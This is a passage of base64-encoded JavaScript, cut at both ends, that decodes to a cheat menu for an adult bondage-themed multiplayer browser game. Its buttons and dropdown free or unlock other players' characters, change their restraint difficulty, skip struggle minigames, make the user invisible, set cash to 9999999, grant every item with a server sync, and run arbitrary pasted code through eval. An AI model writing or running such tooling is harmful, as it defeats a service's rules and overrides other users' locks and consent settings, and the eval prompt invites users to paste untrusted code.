mcmVzaChQbGF5ZXIpOyAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIAp9KTsKdmFyIGJ1dHRvbjIgPSBjcmVhdGVCdXR0b24oIkZvcmNlIFJvb20gU3dhcCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyksZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ0lucHV0Q2hhdCcpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdUZXh0QXJlYUNoYXRMb2cnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAvLyBjYWxsIHVwZGF0ZUNvbnRleHRNZW51IHRvIHVwZGF0ZSB0aGUgY29udGV4dCBtZW51CgogICAgCn0pOwoKdmFyIGJ1dHRvbjkgPSBjcmVhdGVCdXR0b24oIlZpc2libGUiLCBmdW5jdGlvbigpIHsKICBqYXZhc2NyaXB0OkNoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB2aXNiID0gdHJ1ZTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIHVwZGF0ZUNvbnRleHRNZW51KCk7IC8vIGNhbGwgdXBkYXRlQ29udGV4dE1lbnUgdG8gdXBkYXRlIHRoZSBjb250ZXh0IG1lbnUKCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxlcyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjIuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24zLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjUuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b242LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjguc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b245LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMTAuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwoKCgovL0hvdmVyIGV2ZW50cyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwogICAgdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7CiAgICB9KTsKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewogICAgdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKICAgIH0pOwoKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTAuNXB4IjsKfSk7CmJ1dHRvbjcuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjEwLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCi8vRHJvcGRvd24gTWVudQoKZnVuY3Rpb24gZm9yY2VjbG9zZW1lbnUoKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgRGlhbG9nTGVhdmUoKTsKICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICB9CgogLy8gQ3JlYXRlIGEgZHJvcGRvd24gbWVudQp2YXIgc2VsZWN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2VsZWN0Iik7CnNlbGVjdC5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLnBhZGRpbmcgPSAiNHB4IjsKc2VsZWN0LnN0eWxlLndpZHRoID0gIjIwMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblRvcCA9ICItMjBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5SaWdodCA9ICIycHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luQm90dG9tID0gIjNweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjJweCI7CnZhciBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEudmFsdWUgPSAib3B0MSI7Cm9wdGlvbjEudGV4dCA9ICJQZXJzb25hbGlzYXRpb24gTWVudSI7Cm9wdGlvbjEuc2VsZWN0ZWQgPSB0cnVlOwpvcHRpb24xLmRpc2FibGVkID0gdHJ1ZTsKdmFyIG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMi52YWx1ZSA9ICJvcHQyIjsKb3B0aW9uMi50ZXh0ID0gIkVkaXQgQ2FzaCI7CnZhciBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjMudmFsdWUgPSAib3B0MyI7Cm9wdGlvbjMudGV4dCA9ICJNYXggU2tpbGxzIjsKdmFyIG9wdGlvbjQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNC52YWx1ZSA9ICJvcHQ0IjsKb3B0aW9uNC50ZXh0ID0gIk1heCBSZXB1dGF0aW9uIjsKdmFyIG9wdGlvbjUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNS52YWx1ZSA9ICJvcHQ1IjsKb3B0aW9uNS50ZXh0ID0gIlB1cmNoYXNlIEV2ZXJ5dGhpbmciOwp2YXIgb3B0aW9uNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb242LnZhbHVlID0gIm9wdDYiOwpvcHRpb242LnRleHQgPSAiUmVsZWFzZSBPd25lciBDb2xsYXIiOwp2YXIgb3B0aW9uNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb243LnZhbHVlID0gIm9wdDciOwpvcHRpb243LnRleHQgPSAiKzEgTEFSUCBMZXZlbCI7CnZhciBvcHRpb244ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjgudmFsdWUgPSAib3B0OCI7Cm9wdGlvbjgudGV4dCA9ICJCZWNvbWUgRXNjYXBlZCBQYXRpZW50IjsKdmFyIG9wdGlvbjkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOS52YWx1ZSA9ICJvcHQ5IjsKb3B0aW9uOS50ZXh0ID0gIkJlY29tZSBDbHViIFNsYXZlIjsKdmFyIG9wdGlvbjEwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEwLnZhbHVlID0gIm9wdDEwIjsKb3B0aW9uMTAudGV4dCA9ICJSZWxlYXNlIENsdWIgVGl0bGUiOwp2YXIgb3B0aW9uMTEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTEudmFsdWUgPSAib3B0MTEiOwpvcHRpb24xMS50ZXh0ID0gIlNldCBHR1RTIExldmVsIjsKdmFyIG9wdGlvbjEyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEyLnZhbHVlID0gIm9wdDEyIjsKb3B0aW9uMTIudGV4dCA9ICJTZXQgRG9tL1N1YiBMZXZlbCI7CnZhciBvcHRpb24xMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMy52YWx1ZSA9ICJvcHQxMyI7Cm9wdGlvbjEzLnRleHQgPSAiU2V0IE5pY2tuYW1lIjsKdmFyIG9wdGlvbjE0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE0LnZhbHVlID0gIm9wdDE0IjsKb3B0aW9uMTQudGV4dCA9ICJGb3JjZSBPcmdhc20iOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24yKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb241KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb244KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTApOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTQpOwoKCgovLyBDcmVhdGUgYSBidXR0b24gdG8gc2hvdyB0aGUgZHJvcGRvd24gbWVudQp2YXIgZHJvcGRvd25CdXR0b24gPSBjcmVhdGVCdXR0b24oIlBlcnNvbmFsaXNhdGlvbiIsIGZ1bmN0aW9uKCkgewogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKfSk7Ci8vIEFwcGx5IENTUyB0byBtYWtlIHRoZSBidXR0b24gaW52aXNpYmxlIGFuZCB0YWtlIG5vIHNwYWNlCmRyb3Bkb3duQnV0dG9uLnN0eWxlLm9wYWNpdHkgPSAiMCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvaW50ZXJFdmVudHMgPSAibm9uZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKZHJvcGRvd25CdXR0b24uc3R5bGUudG9wID0gIi05OTk5cHgiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5sZWZ0ID0gIi05OTk5cHgiOwpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOyAvLyBTdG9wIHRoZSBldmVudCBmcm9tIGJ1YmJsaW5nIHVwIHRvIHRoZSBjb250ZXh0IG1lbnUKfSk7CgpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgdmFyIHNlbGVjdGVkT3B0aW9uID0gc2VsZWN0Lm9wdGlvbnNbc2VsZWN0LnNlbGVjdGVkSW5kZXhdLnZhbHVlOwogIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gOTk5OTk5OQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDIiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDIKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gcHJvbXB0KCJFbnRlciBDYXNoIEFtb3VudCIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMwogICAgamF2YXNjcmlwdDpTa2lsbENoYW5nZSgiSW5maWx0cmF0aW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIlNlbGZCb25kYWdlIiwgMTApOy8vc2VsZi10aWUKICAgIFNraWxsQ2hhbmdlKCJXaWxscG93ZXIiLCAxMCk7Ly9SZXNpc3Qgb3JnYXNtcwogICAgU2tpbGxDaGFuZ2UoIkV2YXNpb24iLCAxMCk7Ly9CYXR0bGUgc2tpbGxzCiAgICBTa2lsbENoYW5nZSgiQm9uZGFnZSIsIDEwKTsvL1RpZSBvdGhlcnMKICAgIFNraWxsQ2hhbmdlKCJEcmVzc2FnZSIsIDEwKTsvL0FCREwKICAgIFNraWxsQ2hhbmdlKCJMb2NrUGlja2luZyIsIDEwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDQiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDQKICAgIGphdmFzY3JpcHQ6UmVwdXRhdGlvbkNoYW5nZSgiR2FtaW5nIiwgMTAwKTsvL0FyY2FkZSBhbmQgS2lua3lEdW5nZW9uCiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJHYW1ibGluZyIsIDEwMCk7Ly9HYW1ibGluZyByb29tCiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJMQVJQIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIk1haWQiLCAxMDApOy8vQ2FuIGJlIGEgTWFpZAogICAgUmVwdXRhdGlvbkNoYW5nZSgiQUJETCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJOdXJzZSIsIDEwMCk7Ly9DYW4gYmUgYSBOdXJzZQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNQogICAgamF2YXNjcmlwdDpTZXJ2ZXJQbGF5ZXJTeW5jCiAgICBBc3NldEZlbWFsZTNEQ0cuZm9yRWFjaChncm91cD0+Z3JvdXAuQXNzZXQuZm9yRWFjaChpdGVtPT5JbnZlbnRvcnlBZGQoUGxheWVyLCBpdGVtLk5hbWUsIGdyb3VwLkdyb3VwKSkpOwogICAgU2VydmVyUGxheWVySW52ZW50b3J5U3luYygpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNgogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlSZW1vdmUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgTG9nQWRkKCJSZWxlYXNlZENvbGxhciIsICJPd25lclJ1bGUiKTsgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ3IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA3CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIExBUlAgc2Vzc2lvbiAmIHNlbGVjdCBjbGFzcyBiZWZvcmUgcnVubmluZycpOwogICAgR2FtZUxBUlBMZXZlbFByb2dyZXNzKDEwMCkgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2V